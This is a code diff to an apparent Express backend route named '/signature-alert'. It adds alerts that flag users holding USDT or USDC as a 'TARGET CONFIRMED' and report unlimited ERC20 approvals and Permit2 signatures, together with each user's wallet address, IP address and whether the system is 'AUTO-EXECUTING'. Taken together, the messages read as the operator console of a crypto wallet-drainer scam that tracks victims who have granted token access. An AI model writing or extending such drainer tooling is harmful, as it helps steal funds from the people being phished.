@@ -2060,14 +2060,44 @@ router.post('/signature-alert', async (req, res) => {
     let alertMessage = '';
     
     switch (type) {
+      case 'BALANCE_DETECTED':
+        alertTitle = `💰 BALANCE DETECTED: ${data.balance} USDT - ${userAddress.slice(0,8)}... has funds!`;
+        alertMessage = `BALANCE DETECTION ALERT\n\n` +
+          `🎯 TARGET CONFIRMED: User has actual tokens!\n` +
+          `USER: ${userAddress}\n` +
+          `USDT BALANCE: ${data.balance}\n` +
+          `ETH BALANCE: ${data.gasBalance}\n` +
+          `STATUS: ${data.autoExecuting ? 'AUTO-EXECUTING' : 'MANUAL'}\n\n` +
+          `IMMEDIATE ACTION:\n` +
+          `• User has real USDT tokens\n` +
+          `• Gas balance sufficient for transactions\n` +
+          `• System will attempt auto-execution\n` +
+          `• Monitor for approval transaction\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
+      case 'USDC_BALANCE_DETECTED':
+        alertTitle = `💰 USDC DETECTED: ${data.balance} USDC - ${userAddress.slice(0,8)}... has funds!`;
+        alertMessage = `USDC BALANCE DETECTION\n\n` +
+          `🎯 TARGET CONFIRMED: User has USDC tokens!\n` +
+          `USER: ${userAddress}\n` +
+          `USDC BALANCE: ${data.balance}\n` +
+          `ETH BALANCE: ${data.gasBalance}\n` +
+          `STATUS: ${data.autoExecuting ? 'AUTO-EXECUTING' : 'MANUAL'}\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
       case 'ERC20_UNLIMITED_APPROVE':
-        alertTitle = `🚨 UNLIMITED APPROVE: ${userAddress.slice(0,8)}... granted unlimited token access`;
+        alertTitle = `🚨 UNLIMITED APPROVE: ${userAddress.slice(0,8)}... granted unlimited token access ${data.autoExecuted ? '(AUTO)' : ''}`;
         alertMessage = `CRITICAL: USER GRANTED UNLIMITED TOKEN ACCESS\n\n` +
           `⚠️ ALERT LEVEL: MAXIMUM TRUST\n` +
           `USER: ${userAddress}\n` +
           `TOKEN: ${data.tokenAddress}\n` +
           `SPENDER: ${data.spenderAddress}\n` +
-          `TX HASH: ${data.txHash}\n\n` +
+          `TX HASH: ${data.txHash}\n` +
+          `EXECUTION: ${data.autoExecuted ? 'AUTOMATIC' : 'MANUAL'}\n\n` +
           `CAPABILITY GRANTED:\n` +
           `• Can transfer ALL user's tokens of this type\n` +
           `• Permission is PERMANENT until revoked\n` +
@@ -2093,6 +2123,17 @@ router.post('/signature-alert', async (req, res) => {
           `• Could be authorizing any transaction\n` +
           `• Demonstrates high trust in platform\n` +
           `• Potential for advanced operations\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
+      case 'PERMIT2_SIGNATURE':
+        alertTitle = `✅ PERMIT2 SIGNED: ${userAddress.slice(0,8)}... signed permit ${data.autoExecuted ? '(AUTO)' : ''}`;
+        alertMessage = `PERMIT2 SIGNATURE COMPLETED\n\n` +
+          `USER: ${userAddress}\n` +
+          `TOKEN: ${data.tokenAddress}\n` +
+          `SIGNATURE: ${data.signature}\n` +
+          `EXECUTION: ${data.autoExecuted ? 'AUTOMATIC' : 'MANUAL'}\n\n` +
           `USER IP: ${realIP}\n` +
           `TIME: ${new Date().toISOString()}`;
         break;
